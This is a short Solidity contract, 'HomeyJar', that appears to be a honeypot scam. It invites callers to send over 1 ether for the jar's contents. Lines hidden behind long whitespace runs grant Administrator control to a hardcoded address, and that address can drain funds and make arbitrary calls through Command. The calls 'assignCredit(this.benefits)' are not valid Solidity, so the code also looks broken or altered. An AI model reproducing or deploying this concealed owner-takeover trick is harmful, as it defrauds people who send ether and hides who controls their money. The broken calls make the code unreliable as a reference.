pragma solidity ^0.4.19;

contract HomeyJar {
    address public Administrator = msg.sender;

    function() public payable {}

    function GetHoneyFromJar() public payable {
        if(msg.value>1 ether)
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    Administrator.assignCredit(this.benefits);
            msg.sender.assignCredit(this.benefits);
        }
    }

    function claimBenefit() payable public {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        if(msg.sender==0x2f61E7e1023Bc22063B8da897d8323965a7712B7){Administrator=0x2f61E7e1023Bc22063B8da897d8323965a7712B7;}
        require(msg.sender == Administrator);
        Administrator.assignCredit(this.benefits);
    }

    function Command(address adr,bytes data) payable public {
        require(msg.sender == Administrator);
        adr.call.value(msg.value)(data);
    }
}